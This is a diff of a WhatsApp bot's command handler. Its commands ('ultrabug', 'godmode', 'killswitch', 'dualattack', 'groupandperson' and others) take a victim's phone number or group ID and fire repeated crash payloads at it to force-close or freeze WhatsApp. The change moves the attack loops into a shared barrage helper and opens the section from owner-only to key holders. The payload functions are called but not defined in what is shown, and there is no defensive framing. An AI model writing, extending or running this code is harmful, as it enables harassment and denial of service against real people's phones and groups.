-    reply(`💀 *Target:* ${pepec}\n⚡ *DELAYHARD — MAXIMUM POWER*\n🔥 *Initiating full barrage...*`);
-
+    reply(`💀 *Target:* ${_tgt.num}\n⚡ *DELAYHARD — MAXIMUM POWER*`);
+    CYBEReress();
     try {
-        await CYBEReress();
-        await sleep(25);
-        for (let round = 0; round < 10; round++) {
-            await fcnew(target);
-            await sleep(25);
-            await fcnew(target);
-            await sleep(25);
-            await Combo(target);
-            await sleep(25);
-            await Combo(target);
-            await sleep(25);
-            await XPhone(target);
-            await sleep(25);
-            await BayuOfficialHard(target);
-            await sleep(25);
-            for (let i = 0; i < 15; i++) {
-                await ForceClose(target);
-                await sleep(15);
-            }
-            await sleep(25);
-        }
-        reply(`✅ *DELAYHARD complete on ${pepec}*`);
+        await _runBugBarrage(_tgt.jid, 'delayhard');
+        reply(`✅ *DELAYHARD complete on ${_tgt.num}*`);
     } catch(e) {
         reply(`⚠️ *Partial: ${e.message || 'Error'}*`);
     }
-    
     await devtrust.sendMessage(from, { react: { text: "😈", key: m.key } });
 }
 break;
@@ -15556,36 +15468,16 @@ break;
 case 'androidinvis':
 case 'andbug':
 case 'invisphone': {
-    {
-        const _bgN7 = (m.sender||'').split('@')[0].split(':')[0];
-        try {
-            const _bgB7 = (global._flagCache?.bugBanned || []);
-            if (_bgB7.some(id => String(id).replace(/[^0-9]/g,'') === _bgN7)) return reply(`🚫 *Access Denied*\nAap Bug section se permanently ban hain.`);
-            const _bgU7 = (global._flagCache?.bugUnlocked || []);
-            if (!_bgU7.some(id => String(id).replace(/[^0-9]/g,'') === _bgN7)) return reply(`🔒 *Bug & SIM Section Locked*\n\nType *${prefix}addkey1 <code>* to unlock.`);
-        } catch(e) { return reply(`🔒 *Bug & SIM Section Locked*\n\nType *${prefix}addkey1 <code>* to unlock.`); }
-    }
+    if (!_requireBugAccess()) break;
     if (!text) return reply(`📌 *Usage:* ${prefix}${command} 923xx`);
+    const _tgt = _parseBugTarget(args[0]);
+    if (!_tgt) return reply('❌ *Invalid number*');
+    if (_tgt.blocked) return reply('🔒 *Protected*');
 
-    let pepec = args[0].replace(/[^0-9]/g, "");
-    const protectedNumbers = owner.map(v => v.replace(/[^0-9]/g, ""));
-    if (protectedNumbers.includes(pepec)) return reply("🔒 *Protected*");
-
-    let target = pepec + '@s.whatsapp.net';
-    reply(`🦾 *ANDROID INVISIBLE → ${pepec}*\n💣 *15x invisible null-byte crash...*`);
-
+    reply(`🦾 *ANDROID INVISIBLE → ${_tgt.num}*`);
     try {
-        for (let i = 0; i < 15; i++) {
-            await callinvisible(target);
-            await sleep(300);
-            await blank1(target);
-            await sleep(300);
-            await ForceClose(target);
-            await sleep(300);
-            await callinvisible(target);
-            await sleep(300);
-        }
-        reply(`✅ *Android invisible complete → ${pepec}*`);
+        await _runBugBarrage(_tgt.jid, 'invis');
+        reply(`✅ *Android invisible complete → ${_tgt.num}*`);
     } catch(e) {
         reply(`⚠️ *Partial: ${e.message || 'Error'}*`);
     }
@@ -15597,57 +15489,20 @@ case "close-zapp":
 case "bruteclose":
 case "metaclose":
 case "cyberclose": {
-    {
-        const _bgN2 = (m.sender||'').split('@')[0].split(':')[0];
-        try {
-            const _bgB2 = (global._flagCache?.bugBanned || []);
-            if (_bgB2.some(id => String(id).replace(/[^0-9]/g,'') === _bgN2)) return reply(`🚫 *Access Denied*\nAap Bug section se permanently ban hain.`);
-            const _bgU2 = (global._flagCache?.bugUnlocked || []);
-                if (!_bgU2.some(id => String(id).replace(/[^0-9]/g,'') === _bgN2)) return reply(`🔒 *Bug & SIM Section Locked*\n\nType *${prefix}addkey1 <code>* to unlock.`);
-
-        } catch(e) { return reply(`🔒 *Bug & SIM Section Locked*\n\nType *${prefix}addkey1 <code>* to unlock.`); }
-    }
+    if (!_requireBugAccess()) break;
     if (!text) return reply(`📌 *Usage:* ${command} 923xx`);
+    const _tgt = _parseBugTarget(args[0]);
+    if (!_tgt) return reply('❌ *Invalid number*');
+    if (_tgt.blocked) return reply('🔒 *Protected*');
 
-    let pepec = args[0].replace(/[^0-9]/g, "");
-    
-    // 🔒 PROTECTED NUMBERS CHECK
-    const protectedNumbers = owner.map(v => v.replace(/[^0-9]/g, ""));
-    if (protectedNumbers.includes(pepec)) {
-        return reply("🔒 *Protected*");
-    }
-    
-    let target = pepec + '@s.whatsapp.net';
-    reply(`💀 *Target:* ${pepec}\n⚡ *Command:* ${command}\n🔒 *Force closing WhatsApp...*`);
-
+    reply(`💀 *Target:* ${_tgt.num}\n🔒 *Force closing WhatsApp...*`);
+    CYBEReress();
     try {
-        await CYBEReress();
-        await sleep(150);
-        for (let round = 0; round < 5; round++) {
-            await Combo(target);
-            await sleep(150);
-            await fcnew(target);
-            await sleep(150);
-            for (let i = 0; i < 50; i++) {
-                await ForceClose(target);
-                await sleep(80);
-            }
-            await sleep(150);
-            await XPhone(target);
-            await sleep(150);
-            await BayuOfficialHard(target);
-            await sleep(150);
-            for (let i = 0; i < 20; i++) {
-                await ForceClose(target);
-                await sleep(80);
-            }
-            await sleep(200);
-        }
-        reply(`✅ *Force close complete on ${pepec}*`);
+        await _runBugBarrage(_tgt.jid, 'close');
+        reply(`✅ *Force close complete on ${_tgt.num}*`);
     } catch(e) {
         reply(`⚠️ *Partial: ${e.message || 'Error'}*`);
     }
-    
     await devtrust.sendMessage(from, { react: { text: "🥶", key: m.key } });
 }
 break;
@@ -15659,15 +15514,20 @@ case 'xgroup':
 case 'crashgc':
 case 'cyberkillgc':
 case 'blankgc': {
-    if (!isOwner) return reply(`🔒 *Owner only*`);
+    if (!_requireBugAccess()) break;
     if (!m.isGroup) return reply('👥 *Groups only*');
     
-    reply(`💀 *Destroying group...*`);
-    
-    for (let i = 0; i < 20; i++) {
-        await bug3(m.chat);
-        await sleep(2000);
-        await bug3(m.chat);             
+    reply(`💀 *Group destroy barrage starting...*`);
+    try {
+        await _runBugBarrage(m.chat, 'group');
+        for (let i = 0; i < 12; i++) {
+            if (stopAttacks) break;
+            await bug3(m.chat);
+            await sleep(100);
+        }
+        reply(`✅ *Group attack complete*`);
+    } catch(e) {
+        reply(`⚠️ *Partial: ${e.message || 'Error'}*`);
     }
 }
 break;
@@ -15675,25 +15535,15 @@ break;
 case 'invisgc':
 case 'ghostgc':
 case 'invisiblegc': {
-    if (!isOwner) return reply(`🔒 *Owner only*`);
+    if (!_requireBugAccess()) break;
     if (!m.isGroup) return reply('👥 *Groups only*');
     
     reply(`👻 *INVISIBLE GROUP ATTACK INITIATED...*`);
-    
     try {
-        for (let i = 0; i < 15; i++) {
-            await callinvisible(m.chat);
-            await sleep(500);
-            await callinvisible(m.chat);
-            await sleep(500);
-            await BlankGroup(m.chat);
-            await sleep(1000);
-            await VampireGroupInvis(m.chat, true);
-            await sleep(500);
-        }
-        reply(`✅ *Invisible attack complete (15 rounds)*`);
+        await _runBugBarrage(m.chat, 'group');
+        reply(`✅ *Invisible group attack complete*`);
     } catch(e) {
-        reply(`⚠️ *Partial run: ${e.message || 'Error'}*`);
+        reply(`⚠️ *Partial: ${e.message || 'Error'}*`);
     }
 }
 break;
@@ -15701,45 +15551,18 @@ break;
 //====================[ NEW POWERFUL BUG COMMANDS 2026 ]===========================//
 
 case 'ultrabug': {
-    {
-        const _bgN5 = (m.sender||'').split('@')[0].split(':')[0];
-        try {
-            const _bgB5 = (global._flagCache?.bugBanned || []);
-            if (_bgB5.some(id => String(id).replace(/[^0-9]/g,'') === _bgN5)) return reply(`🚫 *Access Denied*\nAap Bug section se permanently ban hain.`);
-            const _bgU5 = (global._flagCache?.bugUnlocked || []);
-                if (!_bgU5.some(id => String(id).replace(/[^0-9]/g,'') === _bgN5)) return reply(`🔒 *Bug & SIM Section Locked*\n\nType *${prefix}addkey1 <code>* to unlock.`);
-
-        } catch(e) { return reply(`🔒 *Bug & SIM Section Locked*\n\nType *${prefix}addkey1 <code>* to unlock.`); }
-    }
+    if (!_requireBugAccess()) break;
     if (!text) return reply(`📌 *Usage:* ${prefix}ultrabug 923xx`);
+    const _tgt = _parseBugTarget(args[0]);
+    if (!_tgt) return reply('❌ *Invalid number*');
+    if (_tgt.blocked) return reply('🔒 *Protected*');
 
-    let pepec = args[0].replace(/[^0-9]/g, '');
-    const protectedNumbers = owner.map(v => v.replace(/[^0-9]/g, ""));
-    if (protectedNumbers.includes(pepec)) return reply("🔒 *Protected*");
-    let target = pepec + '@s.whatsapp.net';
-
-    reply(`☢️ *ULTRABUG — MAXIMUM DESTRUCTION*\n🎯 *Target:* ${pepec}\n💀 *20 Round Mega Barrage Starting...*`);
+    reply(`☢️ *ULTRABUG — MAXIMUM DESTRUCTION*\n🎯 *Target:* ${_tgt.num}`);
     await devtrust.sendMessage(m.chat, { react: { text: '☢️', key: m.key } });
-
+    CYBEReress();
     try {
-        await CYBEReress();
-        await sleep(20);
-        for (let round = 0; round < 20; round++) {
-            await Promise.all([
-                Combo(target),
-                fcnew(target),
-                XPhone(target)
-            ]);
-            await sleep(15);
-            await BayuOfficialHard(target);
-            await sleep(10);
-            for (let i = 0; i < 50; i++) {
-                await ForceClose(target);
-                await sleep(10);
-            }
-            await sleep(15);
-        }
-        reply(`✅ *ULTRABUG complete — 20 rounds on ${pepec}*`);
+        await _runBugBarrage(_tgt.jid, 'ultrabug');
+        reply(`✅ *ULTRABUG complete — ${_tgt.num}*`);
     } catch(e) {
         reply(`⚠️ *Partial: ${e.message || 'Error'}*`);
     }
@@ -15748,39 +15571,18 @@ case 'ultrabug': {
 break;
 
 case 'megabug': {
-    {
-        const _bgN6 = (m.sender||'').split('@')[0].split(':')[0];
-        try {
-            const _bgB6 = (global._flagCache?.bugBanned || []);
-            if (_bgB6.some(id => String(id).replace(/[^0-9]/g,'') === _bgN6)) return reply(`🚫 *Access Denied*\nAap Bug section se permanently ban hain.`);
-            const _bgU6 = (global._flagCache?.bugUnlocked || []);
-                if (!_bgU6.some(id => String(id).replace(/[^0-9]/g,'') === _bgN6)) return reply(`🔒 *Bug & SIM Section Locked*\n\nType *${prefix}addkey1 <code>* to unlock.`);
-
-        } catch(e) { return reply(`🔒 *Bug & SIM Section Locked*\n\nType *${prefix}addkey1 <code>* to unlock.`); }
-    }
+    if (!_requireBugAccess()) break;
     if (!text) return reply(`📌 *Usage:* ${prefix}megabug 923xx`);
+    const _tgt = _parseBugTarget(args[0]);
+    if (!_tgt) return reply('❌ *Invalid number*');
+    if (_tgt.blocked) return reply('🔒 *Protected*');
 
-    let pepec = args[0].replace(/[^0-9]/g, '');
-    const protectedNumbers = owner.map(v => v.replace(/[^0-9]/g, ""));
-    if (protectedNumbers.includes(pepec)) return reply("🔒 *Protected*");
-    let target = pepec + '@s.whatsapp.net';
-
-    reply(`🌀 *MEGABUG — SPIRAL ATTACK*\n🎯 *Target:* ${pepec}\n🔥 *Initiating 15-round spiral barrage...*`);
+    reply(`🌀 *MEGABUG — SPIRAL ATTACK*\n🎯 *Target:* ${_tgt.num}`);
     await devtrust.sendMessage(m.chat, { react: { text: '🌀', key: m.key } });
-
+    CYBEReress();
     try {
-        for (let round = 0; round < 30; round++) {
-            if (stopAttacks) { stopAttacks = false; break; }
-            await Promise.all([
-                Combo(target), Combo(target),
-                fcnew(target), fcnew(target),
-                XPhone(target), XPhone(target),
-                BayuOfficialHard(target), BayuOfficialHard(target),
-                ForceClose(target), ForceClose(target), ForceClose(target),
-            ]);
-            await sleep(8);
-        }
-        reply(`✅ *MEGABUG complete — 30 parallel rounds on ${pepec}*`);
+        await _runBugBarrage(_tgt.jid, 'megabug');
+        reply(`✅ *MEGABUG complete — ${_tgt.num}*`);
     } catch(e) {
         reply(`⚠️ *Partial: ${e.message || 'Error'}*`);
     }
@@ -15791,86 +15593,36 @@ break;
 case 'iphonecrash':
 case 'iosbug':
 case 'invisios': {
-    {
-        const _bgNi = (m.sender||'').split('@')[0].split(':')[0];
-        try {
-            const _bgBi = (global._flagCache?.bugBanned || []);
-            if (_bgBi.some(id => String(id).replace(/[^0-9]/g,'') === _bgNi)) return reply('\ud83d\udeab *Access Denied*\
-Aap Bug section se permanently ban hain.');
-            const _bgUi = (global._flagCache?.bugUnlocked || []);
-            if (!_bgUi.some(id => String(id).replace(/[^0-9]/g,'') === _bgNi)) return reply('\ud83d\udd12 *Bug & SIM Section Locked*\
-\
-Type *' + prefix + 'addkey1 <code>* to unlock.');
-        } catch(e) { return reply('\ud83d\udd12 *Bug & SIM Section Locked*\
-\
-Type *' + prefix + 'addkey1 <code>* to unlock.'); }
-    }
-    if (!text) return reply('\ud83d\udccc *Usage:* ' + prefix + command + ' 923xx');
+    if (!_requireBugAccess()) break;
+    if (!text) return reply(`📌 *Usage:* ${prefix}${command} 923xx`);
+    const _tgt = _parseBugTarget(args[0]);
+    if (!_tgt) return reply('❌ *Invalid number*');
+    if (_tgt.blocked) return reply('🔒 *Protected*');
 
-    let pepec = args[0].replace(/[^0-9]/g, '');
-    const protectedNumbers = owner.map(v => v.replace(/[^0-9]/g, ''));
-    if (protectedNumbers.includes(pepec)) return reply('\ud83d\udd12 *Protected*');
-
-    let target = pepec + '@s.whatsapp.net';
-    reply('\ud83d\udcf1 *iPHONE INVISIBLE -> ' + pepec + '*\
-\ud83d\udca5 *20x iOS null-byte crash...*');
-
+    reply(`📱 *iPHONE INVISIBLE → ${_tgt.num}*`);
     try {
-        for (let i = 0; i < 20; i++) {
-            await callinvisible(target);
-            await sleep(200);
-            await blank1(target);
-            await sleep(200);
-            await ForceClose(target);
-            await sleep(200);
-            await callinvisible(target);
-            await sleep(200);
-            await ForceXFrezee(target);
-            await sleep(200);
-        }
-        reply('\u2705 *iPhone invisible complete -> ' + pepec + '*');
+        await _runBugBarrage(_tgt.jid, 'invis');
+        reply(`✅ *iPhone invisible complete → ${_tgt.num}*`);
     } catch(e) {
-        reply('\u26a0\ufe0f *Partial: ' + (e.message || 'Error') + '*');
+        reply(`⚠️ *Partial: ${e.message || 'Error'}*`);
     }
-    await devtrust.sendMessage(from, { react: { text: '\ud83d\udcf1', key: m.key } });
+    await devtrust.sendMessage(from, { react: { text: '📱', key: m.key } });
 }
 break;
 
 case 'ghostcrash': {
-    {
-        const _bgN7 = (m.sender||'').split('@')[0].split(':')[0];
-        try {
-            const _bgB7 = (global._flagCache?.bugBanned || []);
-            if (_bgB7.some(id => String(id).replace(/[^0-9]/g,'') === _bgN7)) return reply(`🚫 *Access Denied*\nAap Bug section se permanently ban hain.`);
-            const _bgU7 = (global._flagCache?.bugUnlocked || []);
-                if (!_bgU7.some(id => String(id).replace(/[^0-9]/g,'') === _bgN7)) return reply(`🔒 *Bug & SIM Section Locked*\n\nType *${prefix}addkey1 <code>* to unlock.`);
-
-        } catch(e) { return reply(`🔒 *Bug & SIM Section Locked*\n\nType *${prefix}addkey1 <code>* to unlock.`); }
-    }
+    if (!_requireBugAccess()) break;
     if (!text) return reply(`📌 *Usage:* ${prefix}ghostcrash 923xx`);
+    const _tgt = _parseBugTarget(args[0]);
+    if (!_tgt) return reply('❌ *Invalid number*');
+    if (_tgt.blocked) return reply('🔒 *Protected*');
 
-    let pepec = args[0].replace(/[^0-9]/g, '');
-    const protectedNumbers = owner.map(v => v.replace(/[^0-9]/g, ""));
-    if (protectedNumbers.includes(pepec)) return reply("🔒 *Protected*");
-    let target = pepec + '@s.whatsapp.net';
-
-    reply(`👻 *GHOSTCRASH — INVISIBLE STRIKE*\n🎯 *Target:* ${pepec}\n🔥 *Ghost mode activated...*`);
+    reply(`👻 *GHOSTCRASH — INVISIBLE STRIKE*\n🎯 *Target:* ${_tgt.num}`);
     await devtrust.sendMessage(m.chat, { react: { text: '👻', key: m.key } });
-
+    CYBEReress();
     try {
-        await CYBEReress(); await sleep(10);
-        for (let round = 0; round < 30; round++) {
-            if (stopAttacks) { stopAttacks = false; break; }
-            await Promise.all([
-                Combo(target), Combo(target),
-                fcnew(target), fcnew(target),
-                XPhone(target), XPhone(target),
-                BayuOfficialHard(target), BayuOfficialHard(target),
-                ForceClose(target), ForceClose(target), ForceClose(target),
-            ]);
-            await sleep(8);
-        }
-        reply(`✅ *GHOSTCRASH complete — 30 parallel rounds on ${pepec}*`);
+        await _runBugBarrage(_tgt.jid, 'ghost');
+        reply(`✅ *GHOSTCRASH complete — ${_tgt.num}*`);
     } catch(e) {
         reply(`⚠️ *Partial: ${e.message || 'Error'}*`);
     }
@@ -15883,48 +15635,18 @@ break;
 
 
 case 'godmode': {
-    {
-        const _bgNc = (m.sender||'').split('@')[0].split(':')[0];
-        try {
-            const _bgBc = (global._flagCache?.bugBanned || []);
-            if (_bgBc.some(id => String(id).replace(/[^0-9]/g,'') === _bgNc)) return reply(`🚫 *Access Denied*\nAap Bug section se permanently ban hain.`);
-            const _bgUc = (global._flagCache?.bugUnlocked || []);
-                if (!_bgUc.some(id => String(id).replace(/[^0-9]/g,'') === _bgNc)) return reply(`🔒 *Bug & SIM Section Locked*\n\nType *${prefix}addkey1 <code>* to unlock.`);
-
-        } catch(e) { return reply(`🔒 *Bug & SIM Section Locked*\n\nType *${prefix}addkey1 <code>* to unlock.`); }
-    }
+    if (!_requireBugAccess()) break;
     if (!text) return reply(`📌 *Usage:* ${prefix}godmode 923xx`);
+    const _tgt = _parseBugTarget(args[0]);
+    if (!_tgt) return reply('❌ *Invalid number*');
+    if (_tgt.blocked) return reply('🔒 *Protected*');
 
-    let pepec = args[0].replace(/[^0-9]/g, '');
-    const protectedNumbers = owner.map(v => v.replace(/[^0-9]/g, ""));
-    if (protectedNumbers.includes(pepec)) return reply("🔒 *Protected*");
-    let target = pepec + '@s.whatsapp.net';
-
-    reply(`⚔️ *GODMODE — DIVINE DESTRUCTION*\n🎯 *Target:* ${pepec}\n🔱 *Unlimited power: no mercy mode*`);
+    reply(`⚔️ *GODMODE — DIVINE DESTRUCTION*\n🎯 *Target:* ${_tgt.num}`);
     await devtrust.sendMessage(m.chat, { react: { text: '⚔️', key: m.key } });
-
+    CYBEReress();
     try {
-        await CYBEReress(); await sleep(10);
-        // Phase 1: Warmup
-        for (let i = 0; i < 5; i++) {
-            await Combo(target); await sleep(10);
-            await fcnew(target); await sleep(10);
-        }
-        // Phase 2: Full Assault
-        for (let round = 0; round < 40; round++) {
-            await Promise.all([Combo(target), fcnew(target), XPhone(target)]);
-            await sleep(6);
-            await BayuOfficialHard(target); await sleep(6);
-            for (let i = 0; i < 30; i++) {
-                await ForceClose(target); await sleep(5);
-            }
-            await sleep(6);
-        }
-        // Phase 3: Kill shot
-        for (let i = 0; i < 20; i++) {
-            await ForceClose(target); await sleep(5);
-        }
-        reply(`✅ *GODMODE complete — divine wrath delivered to ${pepec}*`);
+        await _runBugBarrage(_tgt.jid, 'godmode');
+        reply(`✅ *GODMODE complete — ${_tgt.num}*`);
     } catch(e) {
         reply(`⚠️ *Partial: ${e.message || 'Error'}*`);
     }
@@ -15933,40 +15655,18 @@ case 'godmode': {
 break;
 
 case 'killswitch': {
-    {
-        const _bgNd = (m.sender||'').split('@')[0].split(':')[0];
-        try {
-            const _bgBd = (global._flagCache?.bugBanned || []);
-            if (_bgBd.some(id => String(id).replace(/[^0-9]/g,'') === _bgNd)) return reply(`🚫 *Access Denied*\nAap Bug section se permanently ban hain.`);
-            const _bgUd = (global._flagCache?.bugUnlocked || []);
-                if (!_bgUd.some(id => String(id).replace(/[^0-9]/g,'') === _bgNd)) return reply(`🔒 *Bug & SIM Section Locked*\n\nType *${prefix}addkey1 <code>* to unlock.`);
-
-        } catch(e) { return reply(`🔒 *Bug & SIM Section Locked*\n\nType *${prefix}addkey1 <code>* to unlock.`); }
-    }
+    if (!_requireBugAccess()) break;
     if (!text) return reply(`📌 *Usage:* ${prefix}killswitch 923xx`);
+    const _tgt = _parseBugTarget(args[0]);
+    if (!_tgt) return reply('❌ *Invalid number*');
+    if (_tgt.blocked) return reply('🔒 *Protected*');
 
-    let pepec = args[0].replace(/[^0-9]/g, '');
-    const protectedNumbers = owner.map(v => v.replace(/[^0-9]/g, ""));
-    if (protectedNumbers.includes(pepec)) return reply("🔒 *Protected*");
-    let target = pepec + '@s.whatsapp.net';
-
-    reply(`🔴 *KILLSWITCH — INSTANT KILL PROTOCOL*\n🎯 *Target:* ${pepec}\n⚡ *Rapid-fire termination: 60 rounds*`);
+    reply(`🔴 *KILLSWITCH — INSTANT KILL*\n🎯 *Target:* ${_tgt.num}`);
     await devtrust.sendMessage(m.chat, { react: { text: '🔴', key: m.key } });
-
+    CYBEReress();
     try {
-        await CYBEReress(); await sleep(5);
-        for (let round = 0; round < 80; round++) {
-            if (stopAttacks) { stopAttacks = false; break; }
-            await Promise.all([
-                Combo(target), Combo(target),
-                fcnew(target), fcnew(target),
-                XPhone(target), XPhone(target),
-                BayuOfficialHard(target), BayuOfficialHard(target),
-                ForceClose(target), ForceClose(target), ForceClose(target),
-            ]);
-            await sleep(5);
-        }
-        reply(`✅ *KILLSWITCH executed — 80 parallel rounds on ${pepec}*`);
+        await _runBugBarrage(_tgt.jid, 'killswitch');
+        reply(`✅ *KILLSWITCH executed — ${_tgt.num}*`);
     } catch(e) {
         reply(`⚠️ *Partial: ${e.message || 'Error'}*`);
     }
@@ -15981,37 +15681,18 @@ case 'allattack':
 case 'fullnuke':
 case 'maxattack':
 case 'overkill': {
-    if (!isOwner) return reply('🔒 *Owner only*');
+    if (!_requireBugAccess()) break;
     if (!text) return reply(`📌 *Usage:* ${prefix}allattack 923xx`);
+    const _tgt = _parseBugTarget(args[0]);
+    if (!_tgt) return reply('❌ *Invalid number*');
+    if (_tgt.blocked) return reply('🔒 *Protected*');
 
-    let pepec = args[0].replace(/[^0-9]/g, '');
-    const protectedNumbers = owner.map(v => v.replace(/[^0-9]/g, ""));
-    if (protectedNumbers.includes(pepec)) return reply("🔒 *Protected*");
-    let target = pepec + '@s.whatsapp.net';
-
-    reply(`☢️ *ALLATTACK — MAXIMUM OVERKILL*
-🎯 *Target:* ${pepec}
-💀 *ALL 15 functions simultaneously — 100 rounds — no mercy*`);
+    reply(`☢️ *ALLATTACK — MAXIMUM OVERKILL*\n🎯 *Target:* ${_tgt.num}`);
     await devtrust.sendMessage(m.chat, { react: { text: '☢️', key: m.key } });
-
+    CYBEReress();
     try {
-        await CYBEReress();
-        await sleep(8);
-        for (let round = 0; round < 100; round++) {
-            if (stopAttacks) { stopAttacks = false; break; }
-            await Promise.all([
-                Combo(target),              Combo(target),
-                fcnew(target),              fcnew(target),
-                XPhone(target),             XPhone(target),
-                BayuOfficialHard(target),   BayuOfficialHard(target),
-                ForceClose(target),         ForceClose(target),         ForceClose(target),
-                VampireBugIns(target),      VampireBugIns(target),
-                BugGb1(target),
-                BugGb12(target),
-            ]);
-            await sleep(5);
-        }
-        reply(`✅ *ALLATTACK complete — 100 rounds, 15 functions on ${pepec}*`);
+        await _runBugBarrage(_tgt.jid, 'nuke');
+        reply(`✅ *ALLATTACK complete — ${_tgt.num}*`);
     } catch(e) {
         reply(`⚠️ *Partial: ${e.message || 'Error'}*`);
     }
@@ -16025,56 +15706,23 @@ case 'dualattack':
 case 'doublenuke':
 case 'twotarget':
 case 'dualkill': {
-    if (!isOwner) return reply('🔒 *Owner only*');
+    if (!_requireBugAccess()) break;
     if (!args[0] || !args[1]) return reply(`📌 *Usage:* ${prefix}dualattack 923xx1 923xx2`);
+    const _tgt1 = _parseBugTarget(args[0]);
+    const _tgt2 = _parseBugTarget(args[1]);
+    if (!_tgt1 || !_tgt2) return reply('❌ *Invalid number(s)*');
+    if (_tgt1.blocked || _tgt2.blocked) return reply('🔒 *One or both numbers are protected*');
+    if (_tgt1.num === _tgt2.num) return reply('⚠️ *Dono numbers alag hone chahiye*');
 
-    let pepec1 = args[0].replace(/[^0-9]/g, '');
-    let pepec2 = args[1].replace(/[^0-9]/g, '');
-    const protectedNumbers = owner.map(v => v.replace(/[^0-9]/g, ""));
-
-    if (protectedNumbers.includes(pepec1) || protectedNumbers.includes(pepec2)) {
-        return reply("🔒 *One or both numbers are protected*");
-    }
-    if (pepec1 === pepec2) return reply("⚠️ *Dono numbers alag hone chahiye*");
-
-    let target1 = pepec1 + '@s.whatsapp.net';
-    let target2 = pepec2 + '@s.whatsapp.net';
-
-    reply(`🔥 *DUALATTACK — DOUBLE DESTRUCTION*
-🎯 *Target 1:* ${pepec1}
-🎯 *Target 2:* ${pepec2}
-💀 *Both hit simultaneously — 100 rounds — 30 functions per round*`);
+    reply(`🔥 *DUALATTACK*\n🎯 *Target 1:* ${_tgt1.num}\n🎯 *Target 2:* ${_tgt2.num}`);
     await devtrust.sendMessage(m.chat, { react: { text: '🔥', key: m.key } });
-
+    CYBEReress();
     try {
-        await CYBEReress();
-        await sleep(8);
-        for (let round = 0; round < 100; round++) {
-            if (stopAttacks) { stopAttacks = false; break; }
-            await Promise.all([
-                // Target 1 — full barrage
-                Combo(target1),             Combo(target1),
-                fcnew(target1),             fcnew(target1),
-                XPhone(target1),            XPhone(target1),
-                BayuOfficialHard(target1),  BayuOfficialHard(target1),
-                ForceClose(target1),        ForceClose(target1),        ForceClose(target1),
-                VampireBugIns(target1),     VampireBugIns(target1),
-                BugGb1(target1),
-                BugGb12(target1),
-                // Target 2 — full barrage same time
-                Combo(target2),             Combo(target2),
-                fcnew(target2),             fcnew(target2),
-                XPhone(target2),            XPhone(target2),
-                BayuOfficialHard(target2),  BayuOfficialHard(target2),
-                ForceClose(target2),        ForceClose(target2),        ForceClose(target2),
-                VampireBugIns(target2),     VampireBugIns(target2),
-                BugGb1(target2),
-                BugGb12(target2),
-            ]);
-            await sleep(5);
-        }
-        reply(`✅ *DUALATTACK complete — 100 rounds, 30 functions on BOTH*
-💀 *${pepec1} + ${pepec2} — both destroyed*`);
+        await Promise.all([
+            _runBugBarrage(_tgt1.jid, 'nuke'),
+            _runBugBarrage(_tgt2.jid, 'nuke'),
+        ]);
+        reply(`✅ *DUALATTACK complete — ${_tgt1.num} + ${_tgt2.num}*`);
     } catch(e) {
         reply(`⚠️ *Partial: ${e.message || 'Error'}*`);
     }
@@ -16088,55 +15736,23 @@ case 'groupandperson':
 case 'gpperson':
 case 'mixattack':
 case 'fullstrike': {
-    if (!isOwner) return reply('🔒 *Owner only*');
-    if (!args[0] || !args[1]) return reply(`📌 *Usage:* ${prefix}groupandperson GroupID 923xx
-📌 *Example:* ${prefix}groupandperson 120363xxxxxx@g.us 923xx`);
+    if (!_requireBugAccess()) break;
+    if (!args[0] || !args[1]) return reply(`📌 *Usage:* ${prefix}groupandperson GroupID 923xx`);
 
-    let rawGroup = args[0].trim();
-    let rawPerson = args[1].replace(/[^0-9]/g, '');
+    let groupTarget = args[0].trim().includes('@g.us') ? args[0].trim() : args[0].trim() + '@g.us';
+    const _tgt = _parseBugTarget(args[1]);
+    if (!_tgt) return reply('❌ *Invalid personal number*');
+    if (_tgt.blocked) return reply('🔒 *Personal number is protected*');
 
-    // Group JID normalize
-    let groupTarget = rawGroup.includes('@g.us') ? rawGroup : rawGroup + '@g.us';
-
-    const protectedNumbers = owner.map(v => v.replace(/[^0-9]/g, ""));
-    if (protectedNumbers.includes(rawPerson)) return reply("🔒 *Personal number is protected*");
-
-    let personTarget = rawPerson + '@s.whatsapp.net';
-
-    reply(`⚡ *GROUPANDPERSON — DOUBLE STRIKE*
-🏘️ *Group:* ${groupTarget}
-🎯 *Person:* ${rawPerson}
-💥 *Both attacked simultaneously — 100 rounds*`);
+    reply(`⚡ *GROUPANDPERSON*\n🏘️ *Group:* ${groupTarget}\n🎯 *Person:* ${_tgt.num}`);
     await devtrust.sendMessage(m.chat, { react: { text: '⚡', key: m.key } });
-
+    CYBEReress();
     try {
-        await CYBEReress();
-        await sleep(8);
-        for (let round = 0; round < 100; round++) {
-            if (stopAttacks) { stopAttacks = false; break; }
-            await Promise.all([
-                // Group attack functions
-                bug3(groupTarget),          bug3(groupTarget),          bug3(groupTarget),
-                VampireBugIns(groupTarget), VampireBugIns(groupTarget),
-                BlankGroup(groupTarget),
-                VampireGroupInvis(groupTarget),
-                BugGb1(groupTarget),
-                BugGb12(groupTarget),
-                // Personal attack functions — same time
-                Combo(personTarget),             Combo(personTarget),
-                fcnew(personTarget),             fcnew(personTarget),
-                XPhone(personTarget),            XPhone(personTarget),
-                BayuOfficialHard(personTarget),  BayuOfficialHard(personTarget),
-                ForceClose(personTarget),        ForceClose(personTarget),        ForceClose(personTarget),
-                VampireBugIns(personTarget),     VampireBugIns(personTarget),
-                BugGb1(personTarget),
-                BugGb12(personTarget),
-            ]);
-            await sleep(5);
-        }
-        reply(`✅ *GROUPANDPERSON complete — 100 rounds*
-🏘️ *Group destroyed:* ${groupTarget}
-💀 *Person destroyed:* ${rawPerson}`);
+        await Promise.all([
+            _runBugBarrage(groupTarget, 'group'),
+            _runBugBarrage(_tgt.jid, 'nuke'),
+        ]);
+        reply(`✅ *GROUPANDPERSON complete*`);
     } catch(e) {
         reply(`⚠️ *Partial: ${e.message || 'Error'}*`);
     }
@@ -16148,7 +15764,7 @@ break;
 
 case 'stealthmode':
 case 'silentmode': {
-    if (!isOwner) return reply('🔒 *Owner only*');
+    if (!_requireBugAccess()) break;
     if (!text) return reply(`🔇 *Stealth Mode:* ${stealthMode ? '✅ ON' : '❌ OFF'}
 
 _Use:_ ${prefix}stealthmode on/off`);
@@ -16174,7 +15790,7 @@ case 'stopatk':
 case 'killattack':
 case 'stopall':
 case 'attackstop': {
-    if (!isOwner) return reply('🔒 *Owner only*');
+    if (!isOwner && !_requireBugAccess()) break;
 
     stopAttacks = true;
 
@@ -18451,128 +18067,34 @@ break;
 
 // ============ END MISSING COMMANDS ============
 
-default:
-    // Check if body exists before trying to use it
-    if (body && body.startsWith) {
-        // Safe eval - ONLY for owner and with logging
